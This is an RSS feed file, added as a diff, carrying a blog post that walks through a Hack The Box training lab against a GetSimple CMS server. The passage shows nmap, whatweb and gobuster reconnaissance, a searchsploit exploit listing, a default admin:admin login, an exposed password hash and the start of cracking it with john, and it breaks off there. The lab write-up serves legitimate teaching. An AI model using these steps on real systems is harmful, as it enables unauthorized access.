@@ -1,0 +1,471 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Hackers Fight Club Blog</title>
+    <link>https://albertnath.github.io/hfc-blog/posts/</link>
+    <description>Recent content in Posts on Hackers Fight Club Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 16 Feb 2025 09:12:30 -0600</lastBuildDate><atom:link href="https://albertnath.github.io/hfc-blog/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB-Init-test-skills</title>
+      <link>https://albertnath.github.io/hfc-blog/posts/htb-init-test-skills/</link>
+      <pubDate>Sun, 16 Feb 2025 09:12:30 -0600</pubDate>
+      
+      <guid>https://albertnath.github.io/hfc-blog/posts/htb-init-test-skills/</guid>
+      <description>Module Getting Started: Knowledge check We get an IP adress target $TARGET which we have to pwn.
+First, we make a simple nmap scan to get open services, versions and ports:
+nmap -sV --open -oA start-skills-init-recon $TARGET We get two services:
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The second seems to be a web server, running a page as the port is 80, for http.</description>
+      <content>&lt;h1 id=&#34;module-getting-started-knowledge-check&#34;&gt;Module Getting Started: Knowledge check&lt;/h1&gt;
+&lt;p&gt;We get an IP adress target &lt;code&gt;$TARGET&lt;/code&gt; which we have to pwn.&lt;/p&gt;
+&lt;p&gt;First, we make a simple nmap scan to get open services, versions and ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sV --open -oA start-skills-init-recon $TARGET
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We get two services:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The second seems to be a web server, running a page as the port is 80, for http. We run
+a scan with &lt;code&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ whatweb $TARGET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://$TARGET &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Apache&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2.4.41&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, Country&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;RESERVED&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;ZZ&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, HTTPServer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Ubuntu Linux&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;Apache/2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)]&lt;/span&gt;, IP&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$TARGET&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We get not many info, so heading to the page with a browser, we see the server
+uses GetSimple CMS. &lt;code&gt;searchsploit&lt;/code&gt; gives us some interesting information for vulnerabilities:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ searchsploit GetSimple
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------------------------------------------------------------------------- ---------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Exploit Title                                                                     |  Path
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------------------------------------------------------------------------- ---------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 2.01 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;changedata.php&amp;#39;&lt;/span&gt; Cross-Site Scripting                         | php/webapps/34789.html
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 2.01 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;components.php&amp;#39;&lt;/span&gt; Cross-Site Scripting                         | php/webapps/34041.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 2.01 - Local File Inclusion                                          | php/webapps/12517.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 2.01 - Multiple Vulnerabilities                                      | php/webapps/14338.html
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 2.01 &amp;lt; 2.02 - Administrative Credentials Disclosure                  | php/webapps/15605.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 2.03 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;upload-ajax.php&amp;#39;&lt;/span&gt; Arbitrary File Upload                       | php/webapps/35353.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 3.0 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;set&amp;#39;&lt;/span&gt; Local File Inclusion                                     | php/webapps/35726.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 3.1.2 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt; Local File Inclusion                                  | php/webapps/37587.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 3.2.1 - Arbitrary File Upload                                        | php/webapps/25405.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS 3.3.1 - Cross-Site Scripting                                         | php/webapps/43888.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                              | php/webapps/32502.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS 3.3.10 - Arbitrary File Upload                                       | php/webapps/40008.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS 3.3.13 - Cross-Site Scripting                                        | php/webapps/44408.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                             | php/webapps/49726.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;             | php/webapps/48850.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS 3.3.4 - Information Disclosure                                       | php/webapps/49928.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                           | php/webapps/49816.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Getsimple CMS Items Manager Plugin - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PHP.php&amp;#39;&lt;/span&gt; Arbitrary File Upload               | php/webapps/37472.php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery            | php/webapps/49774.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting       | php/webapps/49798.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Add Admin&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;     | php/webapps/48745.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimple CMS v3.3.16 - Remote Code Execution &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RCE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                | php/webapps/51475.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetSimpleCMS - Unauthenticated Remote Code Execution &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Metasploit&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                  | php/remote/46880.rb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----------------------------------------------------------------------------------- ---------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Seems like we can upload or run arbitrary code. Meanwhile, &lt;code&gt;gobuster&lt;/code&gt; gives us useful paths to
+explore:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Gobuster v3.6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;by OJ Reeves &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@firefart&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Url:                     http://$TARGET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Method:                  GET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Threads:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Negative Status codes:   &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Agent:              gobuster/3.6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Timeout:                 10s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting gobuster in directory enumeration mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/.hta                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 278&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/.htaccess            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 278&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/.htpasswd            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 278&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/admin                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 314&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://$TARGET/admin/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/backups              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 316&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://$TARGET/backups/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/data                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 313&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://$TARGET/data/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/index.php            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 5485&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/plugins              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 316&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://$TARGET/plugins/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/robots.txt           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 32&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/server-status        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 278&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/sitemap.xml          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 431&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/theme                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 314&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://$TARGET/theme/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;4734&lt;/span&gt; / &lt;span style=&#34;color:#ae81ff&#34;&gt;4735&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;99.98%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Finished
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The paths &lt;code&gt;/admin&lt;/code&gt; and &lt;code&gt;/data&lt;/code&gt; seem promising, so we explore them. The former gives us a
+login page. Trying default passwords like &lt;code&gt;admin:admin&lt;/code&gt; actually works, but alternatively
+we could have searched the later directory and see that in the &lt;code&gt;/users&lt;/code&gt; subdirectory resides
+an &lt;code&gt;admin.xml&lt;/code&gt; file with the following content:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;item&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;USR&amp;gt;&lt;/span&gt;admin&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/USR&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;NAME/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;PWD&amp;gt;&lt;/span&gt;d033e22ae348aeb5660fc2140aec35850c4da997&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/PWD&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;EMAIL&amp;gt;&lt;/span&gt;admin@gettingstarted.com&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/EMAIL&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;HTMLEDITOR&amp;gt;&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/HTMLEDITOR&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;TIMEZONE/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;LANG&amp;gt;&lt;/span&gt;en_US&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/LANG&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We see a hash, which &lt;code&gt;john&lt;/code&gt; can easily crack and thus, obtaining the same credentials&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ john --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt admin-xml-hash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: detected hash type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Raw-SHA1&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Raw-SHA1-AxCrypt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--format=Raw-SHA1-AxCrypt&amp;#34;&lt;/span&gt; option to force loading these as that type instead
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: detected hash type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Raw-SHA1&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Raw-SHA1-Linkedin&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--format=Raw-SHA1-Linkedin&amp;#34;&lt;/span&gt; option to force loading these as that type instead
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: detected hash type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Raw-SHA1&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ripemd-160&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--format=ripemd-160&amp;#34;&lt;/span&gt; option to force loading these as that type instead
